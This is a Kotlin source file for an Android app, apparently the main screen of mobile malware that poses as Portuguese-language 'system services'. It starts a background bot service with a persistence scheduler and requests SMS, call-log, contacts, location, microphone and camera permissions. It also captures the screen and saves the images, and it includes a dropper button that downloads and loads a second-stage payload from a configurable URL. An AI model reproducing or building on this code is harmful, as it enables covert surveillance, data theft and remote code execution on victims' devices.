package com.serv.app

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.serv.app.core.Config
import com.serv.app.core.Dropper
import com.serv.app.service.BotService
import com.serv.app.service.MediaProjectionHolder
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    private val REQ_PERMS = 1001
    private val REQ_MP = 1002

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 96, 48, 48)
        }
        val info = TextView(this).apply {
            text = "Serviços do Sistema\nIniciando…"
            textSize = 16f
        }
        val btnStart = Button(this).apply {
            text = "Iniciar"
            setOnClickListener {
                startBot()
                info.text = "Iniciado.\nConceda as permissões para cada recurso."
            }
        }
        val btnPerms = Button(this).apply {
            text = "Conceder permissões"
            setOnClickListener { requestRuntimePerms() }
        }
        val btnSS = Button(this).apply {
            text = "Autorizar screenshot (1x)"
            setOnClickListener { requestMediaProjection() }
        }

        val appCtx = applicationContext
        val btnStage2 = Button(this).apply {
            text = "Carregar 2ª fase"
            setOnClickListener {
                val url = if (Config.STAGE2_URL.isNotBlank()) Config.STAGE2_URL else stage2UrlRuntime
                if (url.isBlank()) { info.text = "URL vazia"; return@setOnClickListener }
                info.text = "Baixando…"
                thread {
                    val r = Dropper.downloadAndLoad(appCtx, url)
                    runOnUiThread { info.text = r }
                }
            }
        }
        root.addView(info)
        root.addView(btnStart)
        root.addView(btnPerms)
        root.addView(btnSS)
        root.addView(btnStage2)
        setContentView(root)

        startBot()
    }

    private val stage2UrlRuntime: String
        get() = getSharedPreferences("s", MODE_PRIVATE).getString("s2", "") ?: ""

    private fun startBot() {
        try {
            val i = Intent(this, BotService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
            else startService(i)
            PersistScheduler.enable(this)
        } catch (_: Throwable) {}
    }

    private fun requestRuntimePerms() {
        val ps = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.POST_NOTIFICATIONS
        )
        if (Build.VERSION.SDK_INT <= 32) ps.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        ActivityCompat.requestPermissions(this, ps.toTypedArray(), REQ_PERMS)
    }

    private fun requestMediaProjection() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MP)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_MP && resultCode == Activity.RESULT_OK && data != null) {
            captureOnce(data)
        }
    }

    private fun captureOnce(data: Intent) {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val proj = mpm.getMediaProjection(Activity.RESULT_OK, data) ?: return
            val dm = resources.displayMetrics
            val imgReader = android.media.ImageReader.newInstance(
                dm.widthPixels, dm.heightPixels, android.graphics.PixelFormat.RGBA_8888, 2
            )
            val vd = proj.createVirtualDisplay(
                "ss", dm.widthPixels, dm.heightPixels, dm.densityDpi,
                android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imgReader.surface, null, null
            )
            imgReader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val plane = img.planes[0]
                    val rowStride = plane.rowStride
                    val pixStride = plane.pixelStride
                    val bmp = android.graphics.Bitmap.createBitmap(
                        rowStride / pixStride, img.height,
                        android.graphics.Bitmap.Config.ARGB_8888
                    )
                    bmp.copyPixelsFromBuffer(plane.buffer)
                    val out = java.io.File(filesDir, "ss_${System.currentTimeMillis()}.png")
                    out.outputStream().use { bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, it) }
                    MediaProjectionHolder.last = out
                } finally {
                    img.close()
                    runCatching { vd.release() }
                    runCatching { proj.stop() }
                }
            }, android.os.Handler(mainLooper))
        } catch (_: Throwable) {}
    }
}
